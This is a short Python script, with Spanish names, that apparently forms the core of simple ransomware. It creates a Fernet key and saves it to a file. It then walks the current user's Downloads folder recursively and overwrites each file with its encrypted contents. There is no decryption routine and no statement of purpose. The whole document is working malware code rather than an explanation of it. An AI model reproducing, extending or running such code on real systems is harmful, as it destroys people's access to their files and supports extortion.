from cryptography.fernet import Fernet
import os

def cargar_clave():
	return open("clv.key","rb").read()

def generar_clave():
	clave = Fernet.generate_key()
	with open("clv.key","wb") as archivo_clave:
		archivo_clave.write(clave)

def encriptar(archivo, clave):
	f = Fernet(clave)
	with open(archivo,"rb") as file:
		info = file.read()
	encryp = f.encrypt(info)
	with open(archivo,"wb") as file:
		file.write(encryp)

def recorrido(contenid,ruta_d,clave):
	for a in contenid:
		print(f"----------------{ruta_d}---------------")
		ruta_a = ruta_d + "/" + a
		if os.path.isdir(ruta_a):
			print(f"{ruta_a} es directorio")
			contenido2 = os.listdir(ruta_a)
			recorrido(contenido2,ruta_a,clave)
		else:
			print(f"{ruta_a} no es directorio")
			encriptar(ruta_a,clave)




usuario = os.getlogin()

ruta = "/home/"

directorio = "/Descargas"

ruta = ruta + usuario + directorio

print(ruta)

contenido = os.listdir(ruta)

generar_clave()

clave = cargar_clave()

recorrido(contenido,ruta,clave)

